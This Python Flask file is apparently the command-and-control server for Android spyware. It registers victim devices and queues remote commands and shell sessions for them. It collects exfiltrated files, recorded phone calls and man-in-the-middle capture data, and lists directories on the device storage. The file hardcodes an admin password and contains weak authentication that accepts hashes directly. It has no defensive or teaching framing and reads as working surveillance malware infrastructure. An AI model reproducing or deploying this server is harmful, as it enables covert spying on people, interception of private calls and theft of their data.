from flask import Flask, request, jsonify, send_from_directory
from werkzeug.utils import secure_filename
import os, hashlib, uuid, datetime

app = Flask(__name__)

# === Config ===
BASE_DIR = os.getcwd()
UPLOADS = os.path.join(BASE_DIR, 'uploads')
DOWNLOADS = os.path.join(BASE_DIR, 'downloads')
CALLS = os.path.join(BASE_DIR, 'call_recordings')
MITM = os.path.join(BASE_DIR, 'mitm_data')
for folder in [UPLOADS, DOWNLOADS, CALLS, MITM]:
    os.makedirs(folder, exist_ok=True)

# === In-Memory Data Stores ===
devices = {}
users = {
    "admin": {"password": hashlib.sha256(b"Cyb37h4ck37").hexdigest()},
    "default_user": {"password": hashlib.sha256(b"user123").hexdigest()}
}
commands, results, shell_sessions = {}, {}, {}

def hash_password(p): return hashlib.sha256(p.encode()).hexdigest()
def now(): return datetime.datetime.utcnow().isoformat()
def allowed(f): return '.' in f and f.rsplit('.', 1)[1].lower() in {'jpg','png','mp4','mp3','txt','zip','wav','json','apk'}

# === Auth ===
@app.route('/login', methods=['POST'])
def login():
    d = request.json
    provided_password = d.get("password")

    for username, info in users.items():
        if info["password"] == provided_password:
            return jsonify({
                "token": username,
                "role": "admin" if username == "admin" else "user",
                "default": username == "default_user"
            })

    return jsonify({"error": "unauthorized"}), 403

# === Device Registration ===
@app.route('/register_device', methods=['POST'])
def register_device():
    d = request.json
    devices[d['device_id']] = {"owner_token": d['owner_token'], "last_seen": now()}
    return jsonify(status='registered')

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    did = request.json.get('device_id')
    if did in devices:
        devices[did]['last_seen'] = now()
        return jsonify(status='ok')
    return jsonify(status='unknown_device'), 404

# === Commands & Shell ===
@app.route('/send_command', methods=['POST'])
def send_command():
    d = request.json
    commands.setdefault(d['device_id'], []).append({
        "command": d['command'], "args": d.get('args'), "time": now()
    })
    return jsonify(status='queued')

@app.route('/get_commands/<device_id>', methods=['GET'])
def get_commands(device_id):
    return jsonify(commands=commands.pop(device_id, []))

@app.route('/command_result', methods=['POST'])
def command_result():
    d = request.json
    results.setdefault(d['device_id'], []).append({"result": d['result'], "time": now()})
    return jsonify(status='logged')

@app.route('/get_results/<device_id>', methods=['GET'])
def get_results(device_id):
    return jsonify(results=results.get(device_id, []))

@app.route('/start_shell/<device_id>', methods=['POST'])
def start_shell(device_id):
    shell_sessions[device_id] = {"active": True, "history": []}
    return jsonify(status="shell_started")

@app.route('/stop_shell/<device_id>', methods=['POST'])
def stop_shell(device_id):
    if device_id in shell_sessions:
        shell_sessions[device_id]["active"] = False
        return jsonify(status="shell_stopped")
    return jsonify(status="not_found"), 404

@app.route('/shell_command/<device_id>', methods=['POST'])
def shell_command(device_id):
    cmd = request.json.get("command")
    if shell_sessions.get(device_id, {}).get("active"):
        shell_sessions[device_id]["history"].append(cmd)
        return jsonify(status="received")
    return jsonify(status="inactive"), 400

# === File Uploads & Navigation ===
@app.route('/upload_file/<device_id>', methods=['POST'])
def upload_file(device_id):
    f = request.files.get('file')
    if f and allowed(f.filename):
        path = os.path.join(UPLOADS, device_id)
        os.makedirs(path, exist_ok=True)
        f.save(os.path.join(path, secure_filename(f.filename)))
        return jsonify(status='uploaded')
    return jsonify(status='invalid'), 400

@app.route('/download_file/<device_id>/<filename>', methods=['GET'])
def download_file(device_id, filename):
    return send_from_directory(os.path.join(DOWNLOADS, device_id), filename, as_attachment=True)

@app.route('/list_files/<device_id>', methods=['GET'])
def list_files(device_id):
    path = os.path.join(DOWNLOADS, device_id)
    return jsonify(files=os.listdir(path) if os.path.exists(path) else [])

@app.route('/list_dir/<device_id>', methods=['GET'])
def list_dir(device_id):
    path = request.args.get('path', '/storage/emulated/0/')
    return jsonify(contents=os.listdir(path)) if os.path.exists(path) else jsonify(contents=[])

# === Call Recordings ===
@app.route('/upload_call_recording/<device_id>', methods=['POST'])
def upload_call_recording(device_id):
    f = request.files.get("file")
    if f and allowed(f.filename):
        p = os.path.join(CALLS, device_id)
        os.makedirs(p, exist_ok=True)
        f.save(os.path.join(p, secure_filename(f.filename)))
        return jsonify(status='saved')
    return jsonify(status='error'), 400

@app.route('/list_call_recordings/<device_id>', methods=['GET'])
def list_call_recordings(device_id):
    p = os.path.join(CALLS, device_id)
    return jsonify(recordings=os.listdir(p) if os.path.exists(p) else [])

@app.route('/download_call_recording/<device_id>/<filename>', methods=['GET'])
def download_call_recording(device_id, filename):
    return send_from_directory(os.path.join(CALLS, device_id), filename, as_attachment=True)

# === MITM Data ===
@app.route('/upload_mitm_data/<device_id>', methods=['POST'])
def upload_mitm_data(device_id):
    f = request.files.get("file")
    if f and allowed(f.filename):
        p = os.path.join(MITM, device_id)
        os.makedirs(p, exist_ok=True)
        f.save(os.path.join(p, secure_filename(f.filename)))
        return jsonify(status='saved')
    return jsonify(status='error'), 400

@app.route('/list_mitm_data/<device_id>', methods=['GET'])
def list_mitm_data(device_id):
    p = os.path.join(MITM, device_id)
    return jsonify(files=os.listdir(p) if os.path.exists(p) else [])

@app.route('/download_mitm_data/<device_id>/<filename>', methods=['GET'])
def download_mitm_data(device_id, filename):
    return send_from_directory(os.path.join(MITM, device_id), filename, as_attachment=True)

# === Admin Controls ===
@app.route('/get_users', methods=['GET'])
def get_users():
    return jsonify(users=list(users.keys()))

@app.route('/admin/devices/<user_token>', methods=['GET'])
def admin_devices(user_token):
    found = [
        {"device_id": d, "last_seen": devices[d]["last_seen"]}
        for d in devices if devices[d]["owner_token"] == user_token
    ]
    return jsonify(devices=found)

@app.route('/change_password', methods=['POST'])
def change_password():
    d = request.json
    token, new_hashed_pass = d['user_token'], d['new_password']
    if token in users:
        users[token]['password'] = new_hashed_pass  # Client already hashes
        return jsonify(status='updated')
    return jsonify(status='not_found'), 404

# === Run ===
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
